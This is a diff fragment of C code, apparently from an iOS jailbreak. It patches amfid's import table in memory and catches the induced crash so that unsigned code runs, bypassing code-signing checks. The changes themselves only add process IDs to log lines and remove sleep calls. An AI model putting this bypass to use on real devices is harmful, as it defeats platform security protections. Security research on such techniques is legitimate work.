@@ -224,7 +224,7 @@ void* amfid_exception_handler(void* arg){
     kern_return_t kr;
     for(;;){
         kern_return_t err;
-        printf("[+]\t[e]\tcalling mach_msg to receive exception message from amfid\n");
+        printf("[+]\t[e]\t[%d]\tcalling mach_msg to receive exception message from amfid\n", getpid());
         if (kill_thread_flag)
             break;
         err = mach_msg(msg,
@@ -332,8 +332,6 @@ void* amfid_exception_handler(void* arg){
             
             mach_port_deallocate(mach_task_self(), thread_port);
             mach_port_deallocate(mach_task_self(), task_port);
-            sleep(2);
-            
             if (err != KERN_SUCCESS){
                 printf("[-]\t[e]\tfailed to send the reply to the exception message %s\n", mach_error_string(err));
             } else{
@@ -350,17 +348,17 @@ int set_exception_handler(mach_port_t amfid_task_port){
     // allocate a port to receive exceptions on:
     mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amfid_exception_port);
     mach_port_insert_right(mach_task_self(), amfid_exception_port, amfid_exception_port, MACH_MSG_TYPE_MAKE_SEND);
-    printf("[set_exception_handler]\tamfid_task_port = 0x%x\n", amfid_task_port);
-    printf("[set_exception_handler]\tamfid_exception_port = 0x%x\n", amfid_exception_port);
+    printf("[set_exception_handler]\t[%d]\tamfid_task_port = 0x%x\n", getpid(), amfid_task_port);
+    printf("[set_exception_handler]\t[%d]\tamfid_exception_port = 0x%x\n", getpid(), amfid_exception_port);
     kern_return_t err = task_set_exception_ports(amfid_task_port,
                                                  EXC_MASK_ALL,
                                                  amfid_exception_port,
                                                  EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,  // we want to receive a catch_exception_raise message with the thread port for the crashing thread
                                                  ARM_THREAD_STATE64);
     if (err != KERN_SUCCESS){
-        printf("[-]\t[h]\terror setting amfid exception port: %s\n", mach_error_string(err));
+        printf("[-]\t[h]\t[%d]\terror setting amfid exception port: %s\n", getpid(), mach_error_string(err));
     } else {
-        printf("[+]\t[h]\tset amfid exception port\n");
+        printf("[+]\t[h]\t[%d]\tset amfid exception port\n", getpid());
         // spin up a thread to handle exceptions:
         pthread_create(&exception_thread, NULL, amfid_exception_handler, NULL);
         return 0;
@@ -407,9 +405,9 @@ uint64_t binary_load_address(mach_port_t tp) {
 // patch amfid so it will allow execution of unsigned code without breaking amfid's own code signature
 uint64_t patch_amfid(mach_port_t amfid_task_port){
     set_exception_handler(amfid_task_port);
-    printf("[+]\tabout to search for the binary load address\n");
+    printf("[+]\t[%d]\tabout to search for the binary load address\n", getpid());
     amfid_base = binary_load_address(amfid_task_port);
-    printf("[i]\tamfid load address: 0x%llx\n", amfid_base);
+    printf("[i]\t[%d]\tamfid load address: 0x%llx\n", getpid(), amfid_base);
     uint64_t old_amfid_MISVSACI = 0;
     mach_vm_size_t sz;
     mach_vm_read_overwrite(amfid_task_port,
@@ -417,7 +415,7 @@ uint64_t patch_amfid(mach_port_t amfid_task_port){
                            8,
                            (mach_vm_address_t)&old_amfid_MISVSACI,
                            &sz);
-    printf("[i]\t Saving off old jump table: 0x%llx\n", old_amfid_MISVSACI);
+    printf("[i]\t[%d]\t Saving off old jump table: 0x%llx\n", getpid(), old_amfid_MISVSACI);
     w64(amfid_task_port, amfid_base+amfid_MISValidateSignatureAndCopyInfo_import_offset, 0x4141414141414140); // crashy
     return old_amfid_MISVSACI;
 }
@@ -718,7 +716,6 @@ uint32_t exec_wrapper(char* prog_name,
     printf("[+]\tExecl was successful: [%s] pid %d\n", prog_name, pid);
     if (strstr(prog_name, "amfideb"))
     {
-      sleep(5);
       printf("[+]\tgiving amfid port to the killer process\n");
       mach_port_name_t pid_port, amfid_port;
       uint64_t pid_proc = get_proc_block(pid);
